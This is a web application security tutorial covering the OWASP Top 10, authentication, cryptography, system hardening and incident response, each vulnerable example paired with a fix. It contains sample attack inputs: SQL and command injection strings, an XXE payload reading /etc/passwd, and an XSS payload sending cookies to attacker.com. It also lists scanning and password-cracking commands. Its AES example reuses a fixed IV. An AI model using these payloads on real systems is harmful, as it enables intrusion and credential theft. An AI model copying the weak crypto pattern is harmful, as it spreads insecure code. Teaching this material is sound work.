# Security Concepts Tutorial
## From Theory to Practice in Web Application Security

---

## Table of Contents
1. [Security Fundamentals](#security-fundamentals)
2. [Common Web Vulnerabilities (OWASP Top 10)](#common-web-vulnerabilities-owasp-top-10)
3. [Authentication and Authorization](#authentication-and-authorization)
4. [Cryptography Basics](#cryptography-basics)
5. [Network Security](#network-security)
6. [Linux System Hardening](#linux-system-hardening)
7. [Security Tools and Techniques](#security-tools-and-techniques)
8. [Incident Response](#incident-response)

---

## Security Fundamentals

### The CIA Triad

The foundation of information security:

```
        ┌───────────────────┐
        │   CONFIDENTIALITY │  Only authorized access
        └─────────┬─────────┘
                  │
                  │
    ┌─────────────┼─────────────┐
    │                           │
┌───┴────────┐            ┌─────┴─────┐
│ INTEGRITY  │            │ AVAILABILITY│
│ No unauthorized        │ Resources   │
│ modification           │ accessible  │
└────────────┘            └────────────┘
```

**Confidentiality**: Data is only accessible to authorized parties
- Encryption (AES, RSA)
- Access controls (file permissions, authentication)
- Data classification

**Integrity**: Data is accurate and unmodified
- Hashing (SHA-256, checksums)
- Digital signatures
- Version control

**Availability**: Systems are accessible when needed
- Redundancy (backups, clustering)
- DDoS protection
- Disaster recovery

### Additional Security Principles

**Principle of Least Privilege**: Users/processes get minimum necessary permissions
```bash
# Bad: Running app as root
sudo node server.js

# Good: Running as dedicated user
sudo useradd -r -s /bin/false nodeapp
sudo -u nodeapp node server.js
```

**Defense in Depth**: Multiple layers of security
```
Internet → Firewall → IDS/IPS → Web App Firewall → Application → Database
```

**Fail Secure**: Systems fail in a secure state
```javascript
// Bad: Default to admin on error
const role = getUserRole() || 'admin';

// Good: Default to least privilege
const role = getUserRole() || 'guest';
```

**Security by Obscurity is NOT Security**: Don't rely on secrecy alone
```bash
# Bad: Hiding SSH on port 2222 only
# Good: Port change + key-based auth + fail2ban
```

---

## Common Web Vulnerabilities (OWASP Top 10)

### 1. Injection (SQL, Command, LDAP)

**SQL Injection**: Attacker inserts malicious SQL into queries

**Vulnerable Code** (Node.js):
```javascript
// NEVER DO THIS
app.get('/user', (req, res) => {
  const username = req.query.username;
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// Attack: ?username=' OR '1'='1
// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'
// Returns all users!
```

**Secure Code**:
```javascript
// Use parameterized queries
app.get('/user', (req, res) => {
  const username = req.query.username;
  const query = 'SELECT * FROM users WHERE username = ?';
  db.query(query, [username], (err, results) => {
    res.json(results);
  });
});

// Or use ORM (Sequelize, Prisma, TypeORM)
const user = await User.findOne({ where: { username } });
```

**Testing for SQL Injection**:
```bash
# Manual testing
curl "http://localhost:3000/user?username=admin'--"
curl "http://localhost:3000/user?username=' OR '1'='1"

# Automated scanning
sqlmap -u "http://localhost:3000/user?username=test" --batch
```

**Command Injection**: Executing arbitrary system commands

**Vulnerable Code**:
```javascript
// DANGEROUS
app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec(`ping -c 4 ${host}`, (err, stdout) => {
    res.send(stdout);
  });
});

// Attack: ?host=google.com; cat /etc/passwd
// Executes: ping -c 4 google.com; cat /etc/passwd
```

**Secure Code**:
```javascript
// Validate and sanitize input
app.get('/ping', (req, res) => {
  const host = req.query.host;

  // Whitelist validation
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).send('Invalid host');
  }

  // Use spawn instead of exec
  const ping = spawn('ping', ['-c', '4', host]);

  ping.stdout.on('data', (data) => {
    res.write(data);
  });

  ping.on('close', () => {
    res.end();
  });
});
```

### 2. Broken Authentication

**Issues**:
- Weak passwords
- Credential stuffing
- Session fixation
- Exposed session tokens

**Practical Example**: Secure Authentication

```javascript
// Bad: Plain text passwords
const user = {
  username: 'john',
  password: 'password123'  // NEVER store plain text!
};

// Good: Hashed passwords with bcrypt
const bcrypt = require('bcrypt');

// Registration
app.post('/register', async (req, res) => {
  const { username, password } = req.body;

  // Password requirements
  if (password.length < 12) {
    return res.status(400).json({ error: 'Password too short' });
  }

  // Hash password
  const saltRounds = 12;
  const hashedPassword = await bcrypt.hash(password, saltRounds);

  // Store in database
  await db.query('INSERT INTO users (username, password) VALUES (?, ?)',
    [username, hashedPassword]);

  res.json({ success: true });
});

// Login
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Get user from database
  const user = await db.query('SELECT * FROM users WHERE username = ?', [username]);

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Compare passwords
  const match = await bcrypt.compare(password, user.password);

  if (!match) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Create session
  req.session.userId = user.id;
  res.json({ success: true });
});
```

**Rate Limiting** (prevent brute force):
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, please try again later'
});

app.post('/login', loginLimiter, async (req, res) => {
  // Login logic
});
```

### 3. Sensitive Data Exposure

**Issues**:
- Transmitting data over HTTP instead of HTTPS
- Storing sensitive data unencrypted
- Weak cryptography
- Exposing secrets in code

**Examples**:

```bash
# Bad: Credentials in code
# config.js
const DB_PASSWORD = 'MySecretPassword123';

# Bad: Committed .env file
# .env in git history

# Good: Environment variables
# .env (in .gitignore!)
DB_PASSWORD=MySecretPassword123

# Good: Use secrets manager
# AWS Secrets Manager, HashiCorp Vault
```

**HTTPS Enforcement**:
```javascript
// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});

// Strict Transport Security header
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});
```

**Encryption at Rest**:
```javascript
const crypto = require('crypto');

// Encrypt sensitive data
function encrypt(text, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key, 'hex'), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString('hex') + ':' + encrypted.toString('hex');
}

// Decrypt
function decrypt(text, key) {
  const parts = text.split(':');
  const iv = Buffer.from(parts.shift(), 'hex');
  const encrypted = Buffer.from(parts.join(':'), 'hex');
  const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key, 'hex'), iv);
  let decrypted = decipher.update(encrypted);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
}
```

### 4. XML External Entities (XXE)

**Vulnerable Code**:
```javascript
const libxmljs = require('libxmljs');

app.post('/upload', (req, res) => {
  // Dangerous: Parsing XML with external entities enabled
  const xmlDoc = libxmljs.parseXml(req.body.xml);
  res.json({ success: true });
});
```

**Attack**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

**Secure Code**:
```javascript
// Disable external entities
const xmlDoc = libxmljs.parseXml(req.body.xml, { noent: false });

// Better: Use JSON instead of XML
app.post('/upload', (req, res) => {
  const data = JSON.parse(req.body);
  res.json({ success: true });
});
```

### 5. Broken Access Control

**Issues**:
- Accessing resources without authorization
- Privilege escalation
- IDOR (Insecure Direct Object Reference)

**IDOR Example**:
```javascript
// Vulnerable: No authorization check
app.get('/api/invoice/:id', async (req, res) => {
  const invoice = await db.query('SELECT * FROM invoices WHERE id = ?', [req.params.id]);
  res.json(invoice);
});

// Attack: Access other users' invoices
// GET /api/invoice/1234 (attacker tries different IDs)
```

**Secure Code**:
```javascript
// Check authorization
app.get('/api/invoice/:id', requireAuth, async (req, res) => {
  const invoice = await db.query(
    'SELECT * FROM invoices WHERE id = ? AND user_id = ?',
    [req.params.id, req.session.userId]
  );

  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }

  res.json(invoice);
});
```

### 6. Security Misconfiguration

**Common Issues**:
- Default credentials
- Verbose error messages
- Unnecessary services enabled
- Missing security headers

**Security Headers**:
```javascript
const helmet = require('helmet');

app.use(helmet());

// Or configure manually
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');

  // XSS protection
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Content Security Policy
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'");

  // Referrer Policy
  res.setHeader('Referrer-Policy', 'no-referrer');

  next();
});
```

**Hide Server Information**:
```javascript
// Remove X-Powered-By header
app.disable('x-powered-by');

// Nginx: Hide version
// In nginx.conf:
// server_tokens off;
```

### 7. Cross-Site Scripting (XSS)

**Types**:
- **Stored XSS**: Malicious script stored in database
- **Reflected XSS**: Script in URL parameter
- **DOM-based XSS**: Client-side script manipulation

**Reflected XSS Example**:
```javascript
// Vulnerable
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Search results for: ${query}</h1>`);
});

// Attack: /search?q=<script>alert('XSS')</script>
// or: /search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Secure Code**:
```javascript
// Sanitize output
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Search results for: ${query}</h1>`);
});

// React automatically escapes (safe by default)
function SearchResults({ query }) {
  return <h1>Search results for: {query}</h1>;
}

// But be careful with dangerouslySetInnerHTML!
// NEVER do this with user input:
function UnsafeComponent({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

**Content Security Policy** (best defense):
```javascript
res.setHeader('Content-Security-Policy',
  "default-src 'self'; script-src 'self'; object-src 'none'");
```

### 8. Insecure Deserialization

**Vulnerable Code**:
```javascript
// Dangerous: Deserializing untrusted data
app.post('/import', (req, res) => {
  const obj = eval(req.body.data);  // NEVER use eval!
  res.json(obj);
});

// Also dangerous with certain libraries
const obj = deserialize(req.body.data);
```

**Secure Alternatives**:
```javascript
// Use JSON.parse (safe)
app.post('/import', (req, res) => {
  try {
    const obj = JSON.parse(req.body.data);
    // Validate object structure
    if (!obj.hasOwnProperty('expectedField')) {
      return res.status(400).json({ error: 'Invalid data' });
    }
    res.json(obj);
  } catch (e) {
    res.status(400).json({ error: 'Invalid JSON' });
  }
});
```

### 9. Using Components with Known Vulnerabilities

**Check Dependencies**:
```bash
# npm audit
npm audit
npm audit fix

# Install snyk
npm install -g snyk
snyk test
snyk monitor

# Check specific package
npm view package-name versions
npm outdated

# Update dependencies
npm update
npm install package-name@latest
```

**Dependabot / Renovate**: Automate dependency updates

### 10. Insufficient Logging & Monitoring

**What to Log**:
- Authentication attempts (success/failure)
- Authorization failures
- Input validation failures
- Server errors
- Security events

**Secure Logging**:
```javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// Log authentication
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await authenticate(username, password);

  if (!user) {
    logger.warn(`Failed login attempt for user: ${username} from IP: ${req.ip}`);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  logger.info(`Successful login for user: ${username} from IP: ${req.ip}`);
  res.json({ success: true });
});

// IMPORTANT: Never log passwords or sensitive data!
logger.error(`Error processing payment for user ${userId}`);  // Good
logger.error(`Error processing payment: ${JSON.stringify(req.body)}`);  // Bad (might contain card number)
```

---

## Authentication and Authorization

### Authentication Methods

**1. Password-Based**:
```javascript
// Use bcrypt for hashing
const bcrypt = require('bcrypt');
const hashedPassword = await bcrypt.hash(password, 12);
const match = await bcrypt.compare(password, hashedPassword);
```

**2. Token-Based (JWT)**:
```javascript
const jwt = require('jsonwebtoken');

// Generate token
const token = jwt.sign(
  { userId: user.id, username: user.username },
  process.env.JWT_SECRET,
  { expiresIn: '1h' }
);

// Verify token
const decoded = jwt.verify(token, process.env.JWT_SECRET);

// Middleware
const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
};
```

**3. OAuth 2.0 / OpenID Connect**: Delegate to third-party (Google, GitHub)

**4. Multi-Factor Authentication (MFA)**:
```javascript
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

// Generate secret
const secret = speakeasy.generateSecret({ name: 'MyApp' });

// Generate QR code
QRCode.toDataURL(secret.otpauth_url, (err, dataUrl) => {
  // Display QR code to user
});

// Verify token
const verified = speakeasy.totp.verify({
  secret: user.mfaSecret,
  encoding: 'base32',
  token: req.body.token,
  window: 2
});
```

### Authorization (RBAC - Role-Based Access Control)

```javascript
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read']
};

const requirePermission = (permission) => {
  return (req, res, next) => {
    const userRole = req.user.role;
    const permissions = roles[userRole] || [];

    if (!permissions.includes(permission)) {
      return res.status(403).json({ error: 'Forbidden' });
    }

    next();
  };
};

// Usage
app.delete('/api/users/:id', requireAuth, requirePermission('manage_users'), async (req, res) => {
  // Delete user
});
```

---

## Cryptography Basics

### Hashing (One-Way)

**Purpose**: Verify integrity, store passwords

```bash
# MD5 (broken - don't use for security)
echo -n "Hello" | md5sum
# Output: 8b1a9953c4611296a827abf8c47804d7

# SHA-256 (secure)
echo -n "Hello" | sha256sum
# Output: 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969

# Verify file integrity
sha256sum file.txt > file.txt.sha256
sha256sum -c file.txt.sha256
```

**In Node.js**:
```javascript
const crypto = require('crypto');

// Hash data
const hash = crypto.createHash('sha256').update('Hello').digest('hex');

// Verify
const expectedHash = '185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969';
if (hash === expectedHash) {
  console.log('Verified!');
}
```

### Symmetric Encryption (Same Key)

**Algorithms**: AES-256

```javascript
const crypto = require('crypto');

// Generate key (keep secret!)
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(16);

// Encrypt
function encrypt(text) {
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

// Decrypt
function decrypt(encrypted) {
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}
```

### Asymmetric Encryption (Public/Private Keys)

**Algorithms**: RSA, ECC

```bash
# Generate RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -outform PEM -pubout -out public.pem

# Encrypt with public key
echo "Secret message" > message.txt
openssl rsautl -encrypt -pubin -inkey public.pem -in message.txt -out message.enc

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in message.enc
```

**Digital Signatures**:
```bash
# Sign file
openssl dgst -sha256 -sign private.pem -out signature.bin file.txt

# Verify signature
openssl dgst -sha256 -verify public.pem -signature signature.bin file.txt
```

---

## Network Security

### SSH Hardening

```bash
# Edit SSH config
sudo nano /etc/ssh/sshd_config
```

```
# Disable root login
PermitRootLogin no

# Disable password authentication (use keys only)
PasswordAuthentication no
PubkeyAuthentication yes

# Change default port
Port 2222

# Limit users
AllowUsers john alice

# Disable empty passwords
PermitEmptyPasswords no

# Protocol 2 only
Protocol 2
```

```bash
# Restart SSH
sudo systemctl restart sshd

# Generate SSH key pair
ssh-keygen -t ed25519 -C "user@example.com"

# Copy public key to server
ssh-copy-id -p 2222 user@server

# SSH with key
ssh -p 2222 -i ~/.ssh/id_ed25519 user@server
```

### Fail2Ban (Intrusion Prevention)

```bash
# Install
sudo apt install fail2ban

# Configure
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo nano /etc/fail2ban/jail.local
```

```ini
[sshd]
enabled = true
port = 2222
maxretry = 3
bantime = 3600
findtime = 600

[nginx-http-auth]
enabled = true
```

```bash
# Start service
sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# Check status
sudo fail2ban-client status
sudo fail2ban-client status sshd

# Unban IP
sudo fail2ban-client set sshd unbanip 192.168.1.100
```

### VPN (WireGuard)

```bash
# Install WireGuard
sudo apt install wireguard

# Generate keys
wg genkey | tee privatekey | wg pubkey > publickey

# Configure server
sudo nano /etc/wireguard/wg0.conf
```

```ini
[Interface]
PrivateKey = <server_private_key>
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32
```

```bash
# Start VPN
sudo wg-quick up wg0
sudo systemctl enable wg-quick@wg0

# Check status
sudo wg show
```

---

## Linux System Hardening

### File Integrity Monitoring

```bash
# Install AIDE
sudo apt install aide

# Initialize database
sudo aideinit

# Move database
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Check for changes
sudo aide --check

# Update database after legitimate changes
sudo aide --update
```

### AppArmor / SELinux

```bash
# AppArmor status
sudo aa-status

# Enable profile
sudo aa-enforce /etc/apparmor.d/usr.sbin.nginx

# Complain mode (log only)
sudo aa-complain /etc/apparmor.d/usr.sbin.nginx

# Disable profile
sudo aa-disable /etc/apparmor.d/usr.sbin.nginx
```

### Kernel Hardening (sysctl)

```bash
# Edit sysctl configuration
sudo nano /etc/sysctl.conf
```

```ini
# IP forwarding (disable if not router)
net.ipv4.ip_forward = 0

# SYN cookies (prevent SYN flood)
net.ipv4.tcp_syncookies = 1

# Ignore ICMP redirects
net.ipv4.conf.all.accept_redirects = 0

# Ignore source routed packets
net.ipv4.conf.all.accept_source_route = 0

# Log suspicious packets
net.ipv4.conf.all.log_martians = 1
```

```bash
# Apply changes
sudo sysctl -p
```

---

## Security Tools and Techniques

### Port Scanning (nmap)

```bash
# Basic scan
nmap 192.168.1.100

# Service detection
nmap -sV 192.168.1.100

# OS detection
sudo nmap -O 192.168.1.100

# Vulnerability scan
nmap --script vuln 192.168.1.100

# Scan for specific vulnerabilities
nmap --script http-sql-injection 192.168.1.100
```

### Web Application Scanning

```bash
# Nikto (web server scanner)
nikto -h http://192.168.1.100

# OWASP ZAP (full web app scanner)
zap-cli quick-scan http://localhost:3000

# Burp Suite (intercept and modify requests)
# GUI tool - great for manual testing
```

### Password Cracking

```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat (GPU-accelerated)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
# -m 0 = MD5, -m 1000 = NTLM, -m 1800 = sha512crypt
```

### Security Auditing

```bash
# Lynis (system audit)
sudo apt install lynis
sudo lynis audit system

# OpenVAS (vulnerability scanner)
# Full vulnerability assessment platform
```

---

## Incident Response

### Detection

```bash
# Monitor logs for suspicious activity
sudo tail -f /var/log/auth.log
sudo journalctl -u sshd -f

# Check for unauthorized users
cat /etc/passwd
who
last

# Check for suspicious processes
ps aux | grep -v "\[" | less
top
htop

# Check network connections
ss -tunap
netstat -tunap

# Check for rootkits
sudo apt install rkhunter
sudo rkhunter --check
```

### Containment

```bash
# Disconnect from network
sudo ip link set eth0 down

# Block IP address
sudo ufw deny from 192.168.1.100

# Kill suspicious process
sudo kill -9 <PID>

# Disable compromised user
sudo usermod -L username
sudo passwd -l username
```

### Recovery

```bash
# Restore from backup
tar -xzf backup.tar.gz

# Reinstall compromised packages
sudo apt install --reinstall package-name

# Update all packages
sudo apt update && sudo apt upgrade

# Change passwords
sudo passwd username

# Rotate keys
ssh-keygen -t ed25519
# Deploy new key to servers
```

---

## Key Takeaways

1. **Security is a process**, not a product
2. **Defense in depth** - multiple layers of security
3. **Least privilege** - minimum necessary access
4. **Input validation** - never trust user input
5. **Keep systems updated** - patch vulnerabilities
6. **Monitor and log** - detect incidents early
7. **Encryption** - protect data in transit and at rest
8. **Secure by default** - fail securely

---

## Next Steps

- Practice in safe environments (VMs, local machines)
- Complete OWASP WebGoat tutorials
- Try HackTheBox / TryHackMe challenges
- Learn about Kubernetes security
- Study for Security+ or CEH certification
- Read security advisories and CVE reports
- Contribute to security audits
- Build security into your development workflow

**For React/TypeScript Developers**: Security should be integrated into every phase of development, from design to deployment. Think like an attacker to defend like a professional!
